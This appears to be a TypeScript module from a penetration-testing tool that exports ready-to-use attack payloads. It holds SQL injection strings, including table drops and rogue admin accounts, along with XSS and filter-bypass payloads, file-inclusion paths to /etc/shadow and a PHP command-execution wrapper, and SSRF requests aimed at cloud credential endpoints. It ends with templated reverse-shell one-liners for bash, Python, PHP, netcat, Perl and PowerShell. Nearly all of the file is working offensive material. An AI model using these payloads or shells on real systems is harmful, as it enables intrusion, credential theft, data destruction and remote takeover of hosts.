// SQL Injection Payloads Library

export interface PayloadCategory {
    name: string;
    description: string;
    payloads: Payload[];
}

export interface Payload {
    name: string;
    payload: string;
    description?: string;
    database?: string;
}

export const sqlInjectionPayloads: PayloadCategory[] = [
    {
        name: 'Authentication Bypass',
        description: 'Payloads to bypass login forms',
        payloads: [
            { name: 'Basic OR', payload: "' OR '1'='1", description: 'Classic OR bypass' },
            { name: 'OR with comment', payload: "' OR 1=1--", description: 'WITH SQL comment' },
            { name: 'OR with hash', payload: "' OR 1=1#", description: 'MySQL comment style' },
            { name: 'Admin bypass', payload: "admin'--", description: 'Bypass admin login' },
            { name: 'Double quote OR', payload: '" OR "1"="1', description: 'Double quote variant' },
            { name: 'OR true', payload: "' OR 'x'='x", description: 'String comparison' },
            { name: 'Numeric OR', payload: '1 OR 1=1', description: 'For numeric fields' },
            { name: 'UNION null', payload: "' UNION SELECT NULL--", description: 'UNION injection start' },
        ],
    },
    {
        name: 'UNION Based',
        description: 'UNION SELECT payloads for data extraction',
        payloads: [
            { name: 'Column count 1', payload: "' UNION SELECT NULL--", database: 'Generic' },
            { name: 'Column count 2', payload: "' UNION SELECT NULL,NULL--", database: 'Generic' },
            { name: 'Column count 3', payload: "' UNION SELECT NULL,NULL,NULL--", database: 'Generic' },
            { name: 'Column count 5', payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL--", database: 'Generic' },
            { name: 'Extract version MySQL', payload: "' UNION SELECT @@version--", database: 'MySQL' },
            { name: 'Extract version MSSQL', payload: "' UNION SELECT @@version--", database: 'MSSQL' },
            { name: 'Extract user MySQL', payload: "' UNION SELECT user()--", database: 'MySQL' },
            { name: 'Extract database MySQL', payload: "' UNION SELECT database()--", database: 'MySQL' },
            { name: 'List tables MySQL', payload: "' UNION SELECT table_name FROM information_schema.tables--", database: 'MySQL' },
            { name: 'List columns MySQL', payload: "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", database: 'MySQL' },
        ],
    },
    {
        name: 'Error Based',
        description: 'Trigger errors to extract data',
        payloads: [
            { name: 'ExtractValue MySQL', payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--", database: 'MySQL' },
            { name: 'UpdateXML MySQL', payload: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--", database: 'MySQL' },
            { name: 'Double query MySQL', payload: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", database: 'MySQL' },
            { name: 'CONVERT error MSSQL', payload: "' AND 1=CONVERT(int,(SELECT @@version))--", database: 'MSSQL' },
        ],
    },
    {
        name: 'Time Based Blind',
        description: 'Time-based blind injection payloads',
        payloads: [
            { name: 'SLEEP MySQL', payload: "' AND SLEEP(5)--", database: 'MySQL' },
            { name: 'BENCHMARK MySQL', payload: "' AND BENCHMARK(10000000,SHA1('test'))--", database: 'MySQL' },
            { name: 'WAITFOR MSSQL', payload: "'; WAITFOR DELAY '0:0:5'--", database: 'MSSQL' },
            { name: 'pg_sleep PostgreSQL', payload: "'; SELECT pg_sleep(5)--", database: 'PostgreSQL' },
            { name: 'Conditional SLEEP', payload: "' AND IF(1=1,SLEEP(5),0)--", database: 'MySQL' },
        ],
    },
    {
        name: 'Boolean Based Blind',
        description: 'Boolean-based blind injection payloads',
        payloads: [
            { name: 'True condition', payload: "' AND 1=1--", description: 'Should return normal' },
            { name: 'False condition', payload: "' AND 1=2--", description: 'Should return different' },
            { name: 'Substring check', payload: "' AND SUBSTRING(@@version,1,1)='5'--", database: 'MySQL' },
            { name: 'ASCII check', payload: "' AND ASCII(SUBSTRING(@@version,1,1))>50--", database: 'MySQL' },
        ],
    },
    {
        name: 'Stacked Queries',
        description: 'Multiple query injection',
        payloads: [
            { name: 'Create user MSSQL', payload: "'; EXEC sp_addlogin 'hacker','password';--", database: 'MSSQL' },
            { name: 'Drop table', payload: "'; DROP TABLE users;--", description: 'Destructive - use with caution' },
            { name: 'Insert data', payload: "'; INSERT INTO users(username,password) VALUES('hacker','pass');--" },
            { name: 'Update data', payload: "'; UPDATE users SET password='hacked' WHERE username='admin';--" },
        ],
    },
    {
        name: 'WAF Bypass',
        description: 'Payloads to bypass Web Application Firewalls',
        payloads: [
            { name: 'Case variation', payload: "' oR '1'='1", description: 'Mixed case' },
            { name: 'Comment insertion', payload: "' OR/**/1=1--", description: 'Inline comments' },
            { name: 'URL encoded', payload: "%27%20OR%20%271%27%3D%271", description: 'URL encoded' },
            { name: 'Double URL encode', payload: "%252527%252520OR%252520%2525271%252527%25253D%2525271" },
            { name: 'Hex encoding', payload: "' OR 0x31=0x31--", description: 'Hex values' },
            { name: 'Unicode', payload: "' OR ＇1＇=＇1", description: 'Unicode characters' },
            { name: 'Newline bypass', payload: "' OR\n1=1--", description: 'Newline insertion' },
            { name: 'Tab bypass', payload: "' OR\t1=1--", description: 'Tab insertion' },
        ],
    },
];

export const xssPayloads: PayloadCategory[] = [
    {
        name: 'Basic XSS',
        description: 'Simple XSS payloads',
        payloads: [
            { name: 'Alert', payload: '<script>alert(1)</script>' },
            { name: 'Alert document.domain', payload: '<script>alert(document.domain)</script>' },
            { name: 'Alert cookies', payload: '<script>alert(document.cookie)</script>' },
            { name: 'Image onerror', payload: '<img src=x onerror=alert(1)>' },
            { name: 'SVG onload', payload: '<svg onload=alert(1)>' },
            { name: 'Body onload', payload: '<body onload=alert(1)>' },
            { name: 'Input onfocus', payload: '<input onfocus=alert(1) autofocus>' },
            { name: 'Marquee onstart', payload: '<marquee onstart=alert(1)>' },
        ],
    },
    {
        name: 'Event Handlers',
        description: 'Various event handler payloads',
        payloads: [
            { name: 'onclick', payload: '<div onclick=alert(1)>Click me</div>' },
            { name: 'onmouseover', payload: '<div onmouseover=alert(1)>Hover me</div>' },
            { name: 'onerror', payload: '<img src=x onerror=alert(1)>' },
            { name: 'onload', payload: '<body onload=alert(1)>' },
            { name: 'onfocus', payload: '<input onfocus=alert(1) autofocus>' },
            { name: 'onblur', payload: '<input onblur=alert(1) autofocus><input autofocus>' },
            { name: 'onchange', payload: '<select onchange=alert(1)><option>1</option><option>2</option></select>' },
            { name: 'onsubmit', payload: '<form onsubmit=alert(1)><input type=submit></form>' },
        ],
    },
    {
        name: 'Filter Bypass',
        description: 'Bypass common XSS filters',
        payloads: [
            { name: 'Case variation', payload: '<ScRiPt>alert(1)</sCrIpT>' },
            { name: 'Null byte', payload: '<scr\0ipt>alert(1)</script>' },
            { name: 'HTML encoding', payload: '&lt;script&gt;alert(1)&lt;/script&gt;' },
            { name: 'Double encoding', payload: '%253Cscript%253Ealert(1)%253C/script%253E' },
            { name: 'Unicode', payload: '<script>\\u0061lert(1)</script>' },
            { name: 'No quotes', payload: '<img src=x onerror=alert(1)>' },
            { name: 'Backticks', payload: '<img src=x onerror=`alert(1)`>' },
            { name: 'SVG/onload', payload: '<svg/onload=alert(1)>' },
        ],
    },
    {
        name: 'Framework Specific',
        description: 'XSS payloads for specific frameworks',
        payloads: [
            { name: 'AngularJS sandbox escape', payload: '{{constructor.constructor("alert(1)")()}}' },
            { name: 'Vue.js v-on', payload: '<div v-on:click="alert(1)">Click</div>' },
            { name: 'React dangerouslySetInnerHTML', payload: '<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}}></div>' },
            { name: 'jQuery selector', payload: "$('<img/src=x onerror=alert(1)>')" },
        ],
    },
    {
        name: 'Polyglots',
        description: 'Multi-context XSS payloads',
        payloads: [
            { name: 'Polyglot 1', payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e" },
            { name: 'Polyglot 2', payload: "'\"><img src=x onerror=alert(1)>" },
            { name: 'Polyglot 3', payload: "javascript:alert(1)//\"><img src=x onerror=alert(1)>" },
        ],
    },
];

export const lfiPayloads: PayloadCategory[] = [
    {
        name: 'Basic LFI',
        description: 'Basic Local File Inclusion payloads',
        payloads: [
            { name: 'etc/passwd', payload: '../../../etc/passwd' },
            { name: 'etc/shadow', payload: '../../../etc/shadow' },
            { name: 'Windows hosts', payload: '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts' },
            { name: 'Windows win.ini', payload: '..\\..\\..\\windows\\win.ini' },
            { name: 'Null byte bypass', payload: '../../../etc/passwd%00' },
            { name: 'Double encoding', payload: '..%252f..%252f..%252fetc/passwd' },
        ],
    },
    {
        name: 'PHP Wrappers',
        description: 'PHP specific LFI payloads',
        payloads: [
            { name: 'php://filter base64', payload: 'php://filter/convert.base64-encode/resource=index.php' },
            { name: 'php://input', payload: 'php://input', description: 'POST PHP code' },
            { name: 'data://', payload: 'data://text/plain,<?php system($_GET["cmd"])?>' },
            { name: 'expect://', payload: 'expect://id', description: 'If expect extension enabled' },
            { name: 'zip://', payload: 'zip://shell.zip#shell.php' },
            { name: 'phar://', payload: 'phar://shell.phar/shell.php' },
        ],
    },
    {
        name: 'Log Poisoning',
        description: 'Log file inclusion for RCE',
        payloads: [
            { name: 'Apache access log', payload: '../../../var/log/apache2/access.log' },
            { name: 'Apache error log', payload: '../../../var/log/apache2/error.log' },
            { name: 'Nginx access log', payload: '../../../var/log/nginx/access.log' },
            { name: 'SSH auth log', payload: '../../../var/log/auth.log' },
            { name: 'Mail log', payload: '../../../var/log/mail.log' },
            { name: 'Proc self environ', payload: '../../../proc/self/environ' },
        ],
    },
];

export const ssrfPayloads: PayloadCategory[] = [
    {
        name: 'Internal Networks',
        description: 'Access internal network resources',
        payloads: [
            { name: 'Localhost', payload: 'http://127.0.0.1/' },
            { name: 'Localhost alt', payload: 'http://localhost/' },
            { name: 'IPv6 localhost', payload: 'http://[::1]/' },
            { name: 'Internal 10.x', payload: 'http://10.0.0.1/' },
            { name: 'Internal 172.x', payload: 'http://172.16.0.1/' },
            { name: 'Internal 192.x', payload: 'http://192.168.0.1/' },
        ],
    },
    {
        name: 'Cloud Metadata',
        description: 'Cloud provider metadata endpoints',
        payloads: [
            { name: 'AWS metadata', payload: 'http://169.254.169.254/latest/meta-data/' },
            { name: 'AWS IAM creds', payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
            { name: 'GCP metadata', payload: 'http://metadata.google.internal/computeMetadata/v1/' },
            { name: 'Azure metadata', payload: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' },
            { name: 'DigitalOcean', payload: 'http://169.254.169.254/metadata/v1/' },
        ],
    },
    {
        name: 'Protocol Smuggling',
        description: 'Use different protocols',
        payloads: [
            { name: 'File protocol', payload: 'file:///etc/passwd' },
            { name: 'Gopher', payload: 'gopher://127.0.0.1:25/_HELO' },
            { name: 'Dict', payload: 'dict://127.0.0.1:11211/stat' },
            { name: 'TFTP', payload: 'tftp://attacker.com/file' },
        ],
    },
];

export const reverseShells = {
    bash: (ip: string, port: string) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
    bashUdp: (ip: string, port: string) => `bash -i >& /dev/udp/${ip}/${port} 0>&1`,
    python: (ip: string, port: string) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    python3: (ip: string, port: string) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    php: (ip: string, port: string) => `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    ruby: (ip: string, port: string) => `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    netcat: (ip: string, port: string) => `nc -e /bin/sh ${ip} ${port}`,
    netcatMkfifo: (ip: string, port: string) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
    perl: (ip: string, port: string) => `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    powershell: (ip: string, port: string) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
};

export const ttySpawnCommands = [
    "python -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "script /dev/null -c bash",
    "/bin/sh -i",
    "perl -e 'exec \"/bin/sh\";'",
    "ruby -e 'exec \"/bin/sh\"'",
    "lua -e \"os.execute('/bin/sh')\"",
    "echo os.system('/bin/bash')",
];
